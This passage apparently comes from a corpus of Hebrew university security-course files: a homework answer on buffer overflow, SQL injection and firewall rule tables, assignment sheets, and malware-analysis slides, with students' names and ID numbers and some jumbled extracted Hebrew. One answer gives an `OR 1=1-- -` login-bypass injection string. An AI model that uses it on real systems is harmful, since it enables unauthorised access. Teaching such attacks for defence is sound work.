  בזיכרוןאקראי ע"י הוספת ערך בזמן ריצה  Buffer Overflowעל מנת למנוע  .)התוקף יכול להריץ  
  המשתנים של הפונקציה לכתובת ההחזרה שלה, ושינוי של ערך זה יעיד על בין   
   Buffer Overflow .מן הידור ע"י וידוא גודל הקלט על מנת למנוע חולשה זו בז והתהליך יתבטל  
   בקוד עצמו.   
  4.  I . ניתן לבצעSQL injection  לשדה של שם המשתמש של`OR 1=1-- -` דבר שיגרום   
  .בכל מצב) Trueהמשתמש (כיוון שהשאילתה תוגדר להחזיר  לאימות     
    II . מיוחדיםניתן למנוע את ההתקפה הזו ע"י בדיקות קלט, הורדת אפשרות לסימנים  
  .= וכד') \בשם המשתמש (למשל '      
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :4שאלה 
  מתייחסים לכל חבילה בצורה ייחודית ובלתי תלויה בחבילות  State-less Packet Filter-ב. 1
קורה בצורה מהירה  rule table .State-less PF-אחרות, החבילה עוברת בדיקה ע"י מעבר ב
  מקשה על הגדרת החוקים. ופשוטה יחסית אך עם זאת קורה ללא אימות וכן
 רק אם הן פותחות חיבור חדש. rule table-חבילות עוברות בדיקה ב State-full Packet Filter-ב
 שומר מידע על חבילות לכל חיבור בכדי לסווג את החיבור. לחיבורים. authorizedשל סיווג  וישנ
State-full PF  מאפשר לנו להוסיף סיווג לחיבורים בנוסף ל-State-less PF  אך עם זאת הוא יותר
  מסובך וצורך משאבים רבים יותר.
2.  1.  
 
 
 
 
 
 
 
 
 
 
 
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :Fire Wall 1טבלת . 2  
Action Ack  Dest. Port  Src. Port  Protocol  Dest. Add  Src. Add  In\Out  Rule Name  
Allow  *  80  *  TCP  SBT_WEB  *  In  Http_In  
Allow  *  *  80  TCP  *  SBT_WEB  Out  Http_Out  
Allow  *  80  *  TCP  FR_WEB  *  In  FRN  
Allow  *  *  80  TCP  *  FR_WEB  Out  FRN_Out  
Allow  *  587  *  TCP  SBT_MAIL  *  In  Mail_In  
Allow  *  *  587  TCP  *  SBT_MAIL  Out  Mail_Out  
Drop  *  *  *  *  *  *  *  Default  
      
  :Fire Wall 2טבלת     
Action Ack  Dest. Port  Src. 
Port  
Protocol  Dest. Add  Src. Add  In\Out  Rule Name  
Drop  *  *  *  TCP  FN_FTP *  In  FN_FTP_Drop  
Allow  *  80  *  TCP  SBT_WEB  FN  Out  Http_Out  
Allow  *  *  80  TCP  FN  SBT_WEB  In  Http_In  
Allow  *  80  *  TCP  FR_WEB  FN  Out  FR_WEB_Out  
Allow  *  *  80  TCP  FN  FR_WEB  In  FR_WEB_In  
Allow  *  *  25  TCP  FN  SBT_MAIL  In  Mail_In  
Allow  *  25  *  TCP  SBT_MAIL  FN  Out  Mail_Out  
Allow * 587 * TCP SBT_MAIL FN Out Mail_Out_Encrypted 
Allow * * 587 TCP FN SBT_MAIL In Mail_In_Encryoted 
Allow * * 23 TCP FN SBT_TELNET In TELNET_In 
Allow * 23 * TCP SBT_TELNET FN Out TELNET_Out 
Drop *  * * * * * * Default 
  
  על מנת לאפשר את הבקשה השנייה במדיניות State-less Firewallבמקום  PS1-השתמשנו ב. 3  
  . עבור בקשה זו אנו צריכים לבדוק את החבילה יותר לעומק על מנת ובן אל הגדירו שסטטיק  
  לזהות את סוג הבקשה.  
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-4\שאלון-עבודת-בית-4\HW4_2019.docx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>

המחלקה להנדסת מערכות מידע ותכנה
אבטחת מחשבים ורשתות תקשורת
(372-1-4601)
עבודה 4
תאריך ההגשה – 21.06.2019
הוראות כלליות:
יש להעלות לאתר ה- Moodle קובץ מכווץ בשם ID1_ID2 (ת"ז המגישים) המכיל קובץ Word  או PDF.
יש להעלות את העבודה לאתר המודל ממשתמש אחד בלבד.
שאלות על העבודה יש לשאול אך ורק בפורום העבודות במודל, שאלות אשר ישאלו בדוא"ל לא יענו!
יש לכתוב תשובות מלאות ומפורטות.
כחלק מתהליך בדיקת העבודה תתבצע בדיקה לזיהוי עבודות מועתקות – אל תעתיקו. כל מקרה של העתקה יטופל על ידי ועדת משמעת אוניברסיטאית.


שאלה 1 – אנטי וירוסים (20 נקודות)
אנטי וירוס
(5 נקודות) הסבירו את הקונספט של אנטי וירוס. מטרותיו, תחום אחריותו ואת מידת האינטרקציה הנדרשת ממנו עם המשתמש.   
(5 נקודות) מדוע התחום של Malware Analysis קיים ולא ניתן להסתפק באנטי וירוסים? 
(5 נקודות) הסבר מה הוא Virus Total? מתי כדאי להשתמש בו? בחר קובץ כלשהו חשוד ובדוק מה התוצאות המסופקות ע"י Virus Total. צרף את פלט התוכנית באמצעות תצלום מסך.
(5 נקודות) הסבירו את ההבדל בין וירוסים ל-Malware.   
שאלה 2 –  Malware Analysis (20 נקודות)
 (3 נקודות) תארו את כללי האצבע הנדרשים בעת ביצוע Malware Analysis.  
(5 נקודות) הסבירו את ההבדלים בין Static ו-Dynamic Analysis. 
(2 נקודות) Strings2 בודק קבצים חשודים ושולח אותם לבדיקה ב-Virus Total? נכון/ לא נכון? הסבירו. 
(5 נקודות) הסבר את התוכנה Procmon ומהי הדרך המומלצת לעבוד איתה? 
(5 נקודות) ציינו את היתרונות והחסרונות של הכלי Cuckoo. 





שאלה 3 – התקפות (40 נקודות)
(10 נקודות) תאר בפירוט ארבע דרכים שונות להזדהות מול מערכת (ספקו דוגמה מעשית לכל אחת מן הדרכים).
(10 נקודות) תאר את ההתקפות הבאות וכיצד ניתן להתגבר עליהן:
Amplification Attacks
Reflection Attacks
SYN Spoofing Attack
 (10 נקודות) הסבר מהו Buffer Overflow ותארו כיצד ניתן למנוע בזמן ריצה ובזמן ההידור. 
(10 נקודות) נתונה מערכת מידע הכוללת טבלת משתמשים אשר בה העמודות Username ו-Password. הניחו כי למערכת ממשק הדורש הזדהות מול שני ערכים אלה. 
(5 נקודות) תארו התקפה אשר תאפשר למשתמש להזדהות ללא ידיעת שם המשתמש והסיסמה.  
(5 נקודות) תארו בפירוט כיצד ניתן למנוע את ההתקפה. 


שאלה 4 – חומות אש (20 נקודות)
(5 נקודות) הסבר את ההבדל בין State-less Packet Filter ל- State-full Packet Filter. בתשובתך ציין יתרונות וחסרונות לכל אחד מהם. 
(15 נקודות) אחרי ההצלחה המסחררת של סטטיק ובן-אל תבורי בארץ ובחו"ל התרחשו תקיפות סייבר רבות על הרשת הארגונית של מותגם.
למותג "סטטיק ובן אל תבורי" ישנן מספר מחלקות אשר לכל אחת מהן מספר שרתים:
מחלקת קשרי החוץ (נמצאת בתת הרשת FRN) – למחלקה שרת HTTP בכתובת FR_WEB.
מחלקת הכספים (נמצאת בתת הרשת FN) – למחלקה שרת FTP  פסיבי בכתובת FN_FTP.
בנוסף, למותג המצליח ישנם שרת SMTP ושרת HTTP בכתובות SBT_MAIL ו-SBT_WEB המשמשים את המותג וגורמים חיצוניים (מעריצים, סוכנים, כותבי שירים, כוראוגרפים וכ"ו).
ישנו גם שרת TELNET בכתובת SBT_TELNET. 
כל השרתים פועלים בפורטים הסטנדרטיים של הפרוטוקול על גבי TCP:
HTTP – פורט 80, FTP – פורט 21, SSH – פורט 22, SMTP מוצפן – פורט 587, SMTP לא מוצפן – פורט 25, Storage – פורט 23

סטטיק ובן-אל הגדירו את המדיניות הבאה:
שרת ה FTP של מחלקת הכספים יהיה זמין רק בתת הרשת FN.
שרת ה HTTP של מחלקת קשרי החוץ חייב להיות זמין לכולם באינטרנט עבור בקשות HTTP מסוג GET ו POST. בקשות HTTP אחרות (למשל DELETE) מותרות רק עבור רק עבור מחשבים ברשת FRN.
שרת ה - HTTP  של המועדון צריך להיות זמין לכולם באינטרנט.
שרת ה – SMTP של המותג צריך להיות זמין לכולם באינטרנט בשירות המוצפן שלו ולכלל הרשת גם בשירות הלא מוצפן שלו.
שרת ה-TELNET יהיה זמין לכולם בארגון ולא ניתן לגישה מחוץ לארגון.
כל השאר אסור.
למותג יש צורך בקניית חומות אש מסוג stateless packet filter הפועל ברמת ה Transport ולא מבצע deep packet inspection או מסוג Proxy server  אשר פועל ברמת ה Application (עבור פרוטוקול מסוים בלבד).


סטטיק ובן-אל ביקשו את עזרתכם ביישום מדיניות האבטחה ברשת. שימו לב שעקב הוצאות חריגות על בגדים מכונפים וקעקועים של בן אל ותקציב עיצוב השיער הגבוה של סטטיק, ביקשו הלקוחות הנכבדים להפחית את מספר חומות האש שיצטרכו לרכוש למינימום האפשרי. כמו כן רכישת חומת אש מסוג Proxy server היא יקרה מאוד, ולכן יש לתת עדיפות ל stateless packet filters
תכננו והכינו תרשים של מבנה הרשת הארגונית ואת חומות האש הנחוצות. על התרשים לציין במפורש מהי כל תת רשת, את מיקום השרתים ואת מיקום חומות האש וסוגן.
עבור כל חומת אש מסוג stateless packet filter מלאו את טבלת החוקים שלה עפ"י הטבלה שהוצגה בתרגול.
עבור כל חומת אש מסוג Proxy server ציינו מדוע היה צורך דווקא בחומת אש מסוג זה ולא ניתן להסתפק ב-Stateless.


 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-מס'-1---חלק-א'-(WIRESHARK)\עבודת-בית-מס'-1---חלק-א'-(WIRESHARK)\Assignment-1---Part-A.docx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>

The Department of Information Systems Engineering
אבטחת מחשבים ורשתות תקשורת
עבודה מס' 1

הוראות הגשה

לעבודה יש שני חלקים.
את החלק הראשון (WIRESHARK), אתם מתבקשים להגיש עד לתאריך 20/5/19 בשעה 23:00 במערכת מודל לתיבת ההגשה המתאימה.
את החלק השני (קריפטוגרפיה), אתם מתבקשים להגיש עד לתאריך 10/4/19 בשעה 23:00 במערכת מודל לתיבת ההגשה המתאימה.
יש להגיש את כל קבצי העבודה לתיבת ההגשה המיועדת במודל, מכווצים ב ZIP כאשר שם הקובץ מכיל את שתי הת.ז של בני הזוג מופרדים בקו תחתון. לדוגמא:   ass1_id1_id2.zip 
שאלות על העבודה יש לשאול בפורום העבודה במודל.
כל יום איחור יוריד 5 נקודות מציון העבודה.
הארכות ינתנו רק במקרים מיוחדים.














חלק א – WIRESHARK
בשאלות הבאות תלמדו לחקור קובץ PCAP שמכיל הקלטה של משתמש ולהסיק מה המשתמש עשה בגלישתו. לטובת השאלה הנ"ל יש להתקין WIRESHARK  על המחשב. 
אנא הורד את הקובץ mystery.pcapng מהקישור הבא
טען את הקובץ PCAP המצורף לעבודת בית (mystery.pcapng) ב - WIRESHARK. הקובץ הנ"ל מכיל הקלטה (פקטות שנשלחו והתקבלו) של משתמש. ידוע כי במהלך ההקלטה שבוצעה המשתמש ביצע את ארבעת הפעולות הבאות: גלש ב-YNET, גלש ב-ONE, והוריד פעמיים קבצים של סרטים שצולמו באיכות  4kמגוגל דרייב.

שאלה מס' 1 (15 נק'):
היכנס לStatistics -> I/O Graph .
הצג את כמות הנתונים שנצרכה במהלך ההקלטה ע"י בחירת השדה המתאים. 
מה ה- display.filter שהשתמשת? (5 נק')
הוסף צילום מסך של הגרף עם אגרגציה של 10 שניות. (5 נק')
חזור לארגרגציה של שניה בודדת.
האם ניתן להפריד בין הסשנים של הגלישה באתרי אינטרנט לסשנים של הורדת הקבצים על בסיס ניתוח ויזואלי של הגרף? (5 נק')
שאלה מס' 2 (10 נק'): 
איך ניתן לזהות איזה מהסשנים שייך לכל אתר אינטרנט? (2 נק')
אחרי כמה שניות מתחילת ההקלטה נכנס המשתמש לאתר ONE? ( 2נק')
אחרי כמה שניות מתחילת ההקלטה נכנס המשתמש לאתר YNET? ( 2נק')
באיזה אתר נוסף ביקר המשתמש בתחילת ההקלטה? ( 2נק')
השלם זמני התחלה וסיום של הפעולות שביצע המשתמש ( 2נק'):






 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-מס'-1---חלק-א'-(WIRESHARK)\עבודת-בית-מס'-1---חלק-א'-(WIRESHARK)\ass1_200878627_204736961.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
  יניב לידן 200878627 מגישים:
  דן אברהם 204736961             
  חלק א' 1עבודה  –אבטחת מחשבים ורשתות תקשורת 
  .1-גדול מ data-ושאורך השל המשתמש  ip-לפי כתובת ה display filter-השתמשנו בא.   .1
  ip.addr==10.100.102.74&&data.len>0 
  ב.   
  
  
  
  
  
  
  
  
  
  
לפי ניתוח ויזואלי בלבד ניתן להניח כי הסשנים של הורדת הקבצים הם בהתחלה ג. 
לעומת גבוה יותר. , איפה שקצב העברת הנתונים הוא בערך) 520-720, 40-160(בשניות ובסוף
שאר הגרף שם קצב העברת הנתונים נמוך יחסית וכנראה שמדובר בסשנים של הגלישה באתרי 
  אינטרנט.
  
ניתן לסמן את  Name Resolutionבאפשרויות של  Viewבתפריט העליון תחת חלונית א.   .2
Resolve Network Addresses .והדבר יציג את כתובות האתרים  
 239.878895לאחר היא  ONEעם אתר  )הראשונים ACK-וה SYNלחיצת היד הראשונה (הב.   
  .מרגע תחילת ההקלטה שניות
 377.145935לאחר  היא YNETהראשונים) עם אתר  ACK-וה SYNלחיצת היד הראשונה (הג.   
  שניות מרגע תחילת ההקלטה.
  .www.quora.com המשתמש ביקר בנוסף באתר ד.  
 ה.   
זמן התחלה (שניות מתחילת   
  ההקלטה)
זמן סיום (שניות מתחילת 
  ההקלטה)
  171.851130 50.044284  הורדת וידאו ראשון
  719.121810  536.864470  הורדת וידאו שני
 YNET  377.145935  477.037794-גלישה ב
 ONE  239.878895  308.323388-גלישה ב
 
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-מס'-1---חלק-ב'-(קריפטוגרפיה)\עבודת-בית-מס'-1---חלק-ב'-(קריפטוגרפיה)\Assignment-1---Part-B.docx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>

The Department of Information Systems Engineering
אבטחת מחשבים ורשתות תקשורת
עבודה מס' 1

הוראות הגשה

לעבודה יש שני חלקים.
את החלק הראשון (WIRESHARK), אתם מתבקשים להגיש עד לתאריך 20/5/19 בשעה 23:00 במערכת מודל לתיבת ההגשה המתאימה.
את החלק השני (קריפטוגרפיה), אתם מתבקשים להגיש עד לתאריך 10/4/19 בשעה 23:00 במערכת מודל לתיבת ההגשה המתאימה.
יש להגיש את כל קבצי העבודה לתיבת ההגשה המיועדת במודל, מכווצים ב ZIP כאשר שם הקובץ מכיל את שתי הת.ז של בני הזוג מופרדים בקו תחתון. לדוגמא:   ass1_id1_id2.zip 
שאלות על העבודה יש לשאול בפורום העבודה במודל.
כל יום איחור יוריד 5 נקודות מציון העבודה.
הארכות ינתנו רק במקרים מיוחדים.














חלק ב' – קריפטוגרפיה
שאלה מס' 3 (15 נק'):
נגדיר פונקציה כללית חדשה Δ  ע"י  (a,b,c) = b,c,a Δ. הוכיחו כי Δ3 היא פונקציית הזהות. 
כלומר הוכיחו  (a,b,c) = a,b,c Δ3   (5 נק')

התבונן בסכמה הבאה:

הקלטים x,y,z הם מחרוזות בינאריות באורך n, והפעולות דומות לפעולות ב – DES.  בתשובתכם אין להסתמך על תכונות f. נגדיר את הסכמה למעלה ע"י הפונקציה x',y',z'=(x,y,z)π.
הוכיחו כי 4π היא פונקציית הזהות. כלומר הוכח x,y,z=(x,y,z) 4π. (5 נק')

אליס מגדירה מערכת הצפנה סימטרית  ע"י 1πΔπ2Δ π3. בכל πj משתמשים במפתחות סיבוב k1j, k2j של הסיבוב ה-j. מהו אלגוריתם הפענוח המתאים למערכת של בוב? (5 נק')


שאלה מספר 4 ( 20נק'): 
להלן סכמה של פרוטוקול דיפי הלמן כפי שתוארה במהלך הקורס:


תאר כיצד תוקף בעל יכולת Man in the middle יכול לתקוף את פרוטוקול Diffie-Hellman (DH). בתשובתך צייר תרשים המראה במדויק את סדר שליחת ההודעות (מיספור כרונולוגי של החיצים) והמניפולציה אשר באמצעותה מצליח התוקף ליישם את ההתקפה על הפרוטוקול (5 נק')
אליס ובוב מתכננים להחליף מפתחות באמצעות פרוטוקול DH, מאחר והפרוטוקול חשוף להתקפת Man in the middle סטודנט בקורס אבטחת מידע הציע להשתמש במנגנון זיהוי מבוסס  (יפורט בהמשך). על כן, אליס ובוב פנו לשרת צד ג' אמין בדרישה להנפקת . שרת האמון הנפיק לאליס ולבוב שני  אשר כל אחד מהם כולל מפתח פרטי ופומבי (זוג אחד לאליס והזוג השני לבוב).
נגדיר את הסימונים הבאים:

להלן תיאור התהליך
אליס ובוב יוצרים מפתח משותף  תוך שימוש בפרוטוקול DH
אליס בוחרת מספר רנדומי  ושולחת לבוב את ההודעה –   
בוב בוחר מספר רנדומי  ושולח לאליס את ההודעה – 
אליס מוודא את  ה –   של בוב, במידה הווידוא הצליח היא שולחת לבוב את ההודעה –
בוב מוודא את ה –   של אליס, במידה הווידוא הצליח הוא שולח לאליס את ההודעה –
אליס ובוב מוודאים את החתימות שהם קיבלו, במידה והווידוא הצליח הם ממשיכים בהתקשרות מוצפנת באמצעות המפתח 

בהסתמך על סעיף א', תאר כיצד תוקף בעל יכולת Man in the middle יכול לתקוף את המנגנון אותו הציע הסטודנט. בתשובתך צייר תרשים המראה את תרשים של סדר שליחת ההודעות (מספור כרונולוגי) ואת המניפולציה אשר באמצעותה מצליח התוקף ליישם את ההתקפה על המנגנון אותו תיאר הסטודנט באופן בו הוא מצליח לקרוא את ההודעות מבלי שאליס ובוב מודעים לכך (10 נק').

כיצד ניתן לתקן את המנגנון אותו הציע הסטודנט ללא שינוי פרוטוקול DH וללא הוספת שלבים נוספים למנגנון. בתשובתך מנה את השינויים הנדרשים בהתייחסות לשלבי הפרוטוקול. בנוסף, צייר תרשים מעודכן של ההתקפה אותה תיארת בסעיף ב' והראה מדוע התקפה זו אינה ניתנת ליישום (5 נק').


שאלה מספר 5 (15 נק'): 
בפקולטה לניהול תעשייתי הוחלט למחשב את תהליך הזנת הציונים. לשם כך הוחלט לעשות שימוש בצופן  המפתח הפומבי RSA. לפקולטה יש זוג מפתחות פומבי - פרטי אחד. המפתח הפומבי (e,n) ידוע לכולם. המפתח הפרטי (d,n) ידוע לשרת הפקולטה ולכל המרצים בלבד. הפרמטר n הינו בגודל 2048 ביטים. בשאלה זו נניח שהסטודנטים אינם יודעים את המפתח הפרטי של הפקולטה.
להל הפרוטוקול שהוצע עבור תהליך הזנת הציונים:

RSApub() הינה הצפנת RSA תחת המפתח הפומבי של הפקולטה.
הנתון IDcourse הוא מספר באורך 128 ביטים המזהה את הקורס (למשל 094011). ניתן להניח שערכי ה-IDcourse של כל הקורסים ידועים לכולם.
הנתונים RANDL ו-RANDS הם מספרים אקראיים באורך 28 ביטים כל אחד שהמרצה והשרת מגרילים בכל הפעלה של הפרוטוקול.
הנתון StudentID הוא מספר שלם המזהה את הסטודנט ואורכו הוא 128 ביטים. כל מספר שלם הוא מספר זהות חוקי.
הנתון Grade הינו הציון (מספר שלם בין 0 ל 100), ואורכו הוא 128 ביטים.
אין הגבלה על מספר ההרצות של הפרוטוקול. אם לסטודנט מסוים מוזן הציון לקורס כלשהו יותר מפעם אחת, ציונו נקבע עפ"י הפעם האחרונה שבה הפרוטוקול הסתיים בהצלחה.
ניתן להניח שכל סטודנט יודע את ציונו בקורס ויודע מתי המרצה יזין את הציון לשרת.
ניתן להניח שכל סטודנט כבר האזין להזנות של ציוניו בלבד בקורסים אחרים.

הסבר כיצד השרת מוודא שאכן אחד המרצים הזין את הציון ולא אחד הסטודנטים (5 נק').

הסטודנט מרכוס יודע שלא הצליח כל כך בקורס "אתיקה למהנדסים" שניתן בשנה ג' וכי ציונו הסופי שיוזן ע"י המרצה הוא 2 מתוך 100 (הציון הנמוך ביותר בתואר שלו). האם מרכוס יכול לבצע התקפת man in the middle להעלות את ציונו? אם כן תאר את ההתקפה היעילה ביותר שהוא יכול לבצע ונתח זמן ריצה וזיכרון. אחרת, נמק מדוע הפרוטוקול המוצע חסין להתקפות man in the middle. (5 נק')

הסטודנט שמואל הציע להתבסס על ניצול החולשה של אלגוריתם RSA לבעית הכפליות בפרוטוקול המוצע מעלה לטובת עדכון הציון. לטענתו ההתקפה הנ"ל משיגה את אותו האפקט ויעילה יותר מההתקפה של מרכוס. האם שמואל צודק? נמק/י (5 נק')

שאלה מספר 6 (25 נק'):
בשאלה זו אתם צריכים לשבור צופן AES  פשוט, המסומן  . בגרסה הפשוטה הזו של AES ישנם 3 מפתחות שונים המוגדרים כ  , השימוש במפתחות הללו הוא כפי שהם (כלומר אין שום מניפולציה על המפתחות).  מבצע 3 פעמים (איטרציות iterations) של   אשר גם הוא גירסא פשוטה של צופן AES.  מוגדר כדלקמן:

M – הודעה לא מוצפנת Plain-text
C – הודעה. מוצפנת Cipher-text
K – מפתח הצפנה/פענוח


ולכן הגדרה של  היא:



בהינתן הודעה M והודעה מוצפנת C כך ש:  , הנכם צריכים לממש שיטה יעילה למציאת 3 המפתחות K1,K2,K3 המקיימת: .
 
האלגוריתם הצפנה  ממומש כך:









שימו לב כי במימוש שלכם לפריצה של  עליכם להתייחס ל  כקופסא שחורה המקבלת הודעה M ו3 מפתחות כקלט ומוציאה כפלט הודעה מוצפנת C לפי ההגדרה נ״ל. אינכם יכולים להשתמש בהודעות הביניים C1 ו C2! כמו כן מפתחות K1 K2 K3  חייבים להיות שונים  אחד מהשני

רשום פתרון תיאורטי לשיטה שאתה מציע (5 נק').
ממש את הפתרון שהצעת ב- JAVA לפי הדגשים הבאים (20 נק'):


דגשים למימוש:
הודעה M יכולה להיות ארוכה יותר מ 128 ביט, המימוש שלכם צריך לקחת בחשבון שאורך הודעה יכול להיות יותר ארוך מ 128 ביט, לחלק את ההודעה לבלוקים של 128 ביט ולהפעיל את האלגוריתם על כל בלוק, לשם הפשטות ניתן להניח כי אורך ההודעה היא מכפלה של 128 ביט.
עליכם לממש ממשק (interface) הצפנה/פענוח כדלקמן:

–e : instruction to encrypt the input file 
–d: instruction to decrypt the input file 
 –k <path>: path to the keys, the key should be 384 bit (128*3) for . and should be divided into 3 separate keys. 
 –i <input file path>: a path to a file we want to encrypt/decrypt 
 –o <output file path>: a path to the output file 
 Usage: Java –jar aes.jar -e/-d –k <path-to-key-file > -i <path-to-input-file> -o <path-to-output-file> 
           Java –jar aes.jar –e –k key.txt –i message.txt –o cypther.txt 

עליכם לממש ממשק (interface) לשבירה של ההצפנה כדלקמן:

o 	–b : instruction to break the encryption algorithm 
o	 –m <path>: denotes the path to the plain-text message 
o 	–c <path>: denotes the path to the cipher-text message 
o	 –o <path>: a path to the output file with the key(s) found. 
o 	Usage: Java –jar aes.jar -b –m <path-to-message> –c <path-to-cipher> -o < output-path> 

פורמט הפלטים והקלטים:
הנכם מתבקשים לכתוב ולקרוא מקבצים בבתים Bytes ולא כטקסט.
שימו לב לסדר בתים (Endianness) ,ניתן לוודא את סדר הבתים בשקופיות של ההרצאה.
השתמשו בקבצי בדיקה שסופקו לכם ביחד עם התרגיל על מנת לבדוק את התוכנית שלכם.

שימו לב כי זמן ריצה של התוכנית צריך להיות בזמן סביר הלא עולה מעל דקה אחת. 
אין להשתמש ב brute force.
עליכם להגיש את כל קבצי המקור וקובץ jar מקומפל של התוכנית שלכם.
הבדיקה מתבצעת בתוכנה אוטומטית, אנא בדקו היטב כי התוכנית שלכם עונה על כל הדרישות הנמצאות בקובץ הזה.
שימו לב כי תוכנה אוטומטית תצליב בין כל קבצי המקור לזיהוי קוד דומה, אנא הימנעו מהעתקות.
ההגשה היא במודל, יש להגיש קובץ zip בלבד בפורמט הבא: ass1_id1_id2.zip בתוך הקובץ יש לשים את כל קבצי המקור וקובץ jar. קובץ jar חייב להיות בשם aes.jar

 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-10---Malware-Analysis\PS-11---Malware-Analysis_new.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 10
MALWARE ANALYSIS


2
Agenda
Introduction to Malware Analysis
Static Analysis
Basic Static Analysis
Advanced Static Analysis
Dynamic Analysis
Basic Dynamic Analysis
Advanced Dynamic Analysis

2

3
Introduction to Malware Analysis

3

4
Malware Analysis
The study of malware by dissecting its different components and studying its behavior on the host computer's operating system.
I/O operations
Static strings
Executed commands
Files accessed
Communication
More...

Used for the inspection of files for the purpose of determining whether they are malware.
4

5
The Concept of Antivirus
The idea behind antiviruses was to detect and prevent viruses from damaging your computer.
The antivirus should run in the background and should interfere only when danger threatens the computer.
5

6
Drawbacks of Antivirus
However, in many cases, it is difficult to decide what is the recommended time to interfere.
Also, many false positives of occurrences will decrease the user’s usability. 
Antivirus has no “memory”. If the first  step of an attack starts today and the second will continue tomorrow, the antivirus will not detect it. 
Most of the cyber attacks moved from malicious to suspicious. 

6

7

רוב ההתקפות היום עברו להתקפה בה הכל תקין אבל התוצאה הסופית שלה תהיה לא לגיטימית. 
למשל: 1. בהתקנת תוסף לפרוקסי, משנים את ההגדרות ברג'יסטרי כדי שהתקשורת תעבור דרך הפרוקסי. זה לגיטימי
אבל ישנם מלוורים שעושים בדיוק את אותם השינויים כדי שהתקשורת תעבור דרכם. 
2. גוגל דואג להוסיף משימה מתוזמנת אוטומטית במערכת שתבדוק עדכונים של גוגל כרום. 
גם המלוורים משתמשים במשימה הזאת. הם פשוט משנים את הפקודה שהיא מריצה או יוצרים אותה עם שינוי ממש קטן וזניח בשם ככה שלא ישימו לב. 
3. תוכנות מסוימות כמו ספוטיפיי מותקנות ככה שברגע שהמחשב עולה היא תרוץ. 
מלוורים משתמשים בתכונה הזאת כדי להעלות בכל הדלקה של המחשב באופן אוטומטי. 
6
Antivirus
If we have antiviruses that can detect malware, why do we need malware analysis?
Antiviruses uses databases of signatures of known malwares.
Therefore, antiviruses can generally detect only known malware.
Zero-days are used on a daily basis.
In the past: Antiviruses checked only the file itself and not its behavior in the memory.

Still before performing malware analysis it is recommended to test also on different antiviruses:
https://www.virustotal.com/
7

8

אז אם כך? למה לא להכניס לו זכרון כדי שיוכל למנוע התקפות?
תשובה: זה כבר לא יהיה אנטי וירוס קטן וחמוד אלא מערכת Malware Detection גדולה וכבדה. 
7
Malware Analysis Rules of Thumb
Some points to keep in mind when performing malware analysis:
Never perform malware analysis on your physical machine – always prefer virtual or isolated machine.
Depending on the tested file, disable machine’s internet connection to avoid associating yourself with the malware.
You should disable antivirus protection on the analysis machine to be able to perform dynamic analysis.
8

9
Static vs Dynamic Analysis
STATIC ANALYSIS
Inspection of the file itself and its resources
Code does not run on the machine
Code might be obfuscated – harder to perform analysis
Looking for:
Strings
Opcodes
Resources
File Metadata
Imports and Exports
Etc.
DYNAMIC ANALYSIS
Inspection of the behavior of a running program
Code runs on the machine
Malware might refuse to perform malicious activity – avoiding detection
Looking for:
I/O Operations
Used files
Executed Commands
System-Calls
Network Requests
Etc.
9

10
Static Analysis
BASIC
10

11
Basic Static Analysis
The use of tools for extracting certain information of a file:
Strings
Resources
Imports
Exports
Used Packers
File Metadata
File (real) Type
When was it created
How was it compiled
Headers / Sections
Etc.

11

12
Strings2
A command line tool for extraction of all strings which can be found in the file. Using different heuristics to determine what is a string.







Strings2 is a Windows command-line tool for extracting ascii and unicode strings from binary data. On top of the classical Sysinternals strings approach, this improved version is also able to dump strings from process address spaces and also reconstructs hidden assembly local variable assignment ascii/unicode strings.
12

13
Strings2
Extracts the strings, metadata of each given file.
Filtering not important data 
Sorted by priority to be important and suspicious







13

14

מסנן ג'יבריש וזבל. 
13
PEiD
Detects packers, cryptors, and compilers bundled in PE executables.
14

15

מה זה PE? זו תחילית של כל קובץ הרצה בהקסדצימלי. 
מוגדר גם כ-Portable Executable זה קובץ הרצאה , DLLים שמשתמשים בהם בגרסאות של וינדוס. 
14
PEview
Provides a quick and easy way to view the structure and content of PE files. The viewer displays header, section, directory, import table, export table, and resource information.
15

16
PEStudio
The most updated tool
Comprises the PEview, as well as PEiD.
Provides a quick and easy way to view the structure and content of PE files. 
The viewer displays 
headers, 
DLLs 
Divides to groups 
Sends the suspicious code to VirusTotal. 
16

17
PEStudio
The most updated tool
Comprises the PEview, as well as PEiD.
Provides a quick and easy way to view the structure and content of PE files. 
The viewer displays 
headers, 
DLLs 
Divides to groups 
Sends the suspicious code to VirusTotal. 
17

18


18

19
VIRUSTOTAL
19

20
VIRUSTOTAL
20

21
Dependency Walker
Advanced tool for experienced experts.
For each DLL, it can show the functions exist.  
21

22
Dependency Walker
Scans any Windows module and builds a hierarchical tree diagram of all dependent modules. For each module found, it lists all the functions that are exported by that module, and which of those functions are actually being called (imported) by other modules.
22

23
Static Analysis
ADVANCED
23

24
Advanced Static Analysis
Using various techniques to disassemble a binary file – Reverse Engineering:
Understand the expected flow of the program.
Find obfuscation techniques.
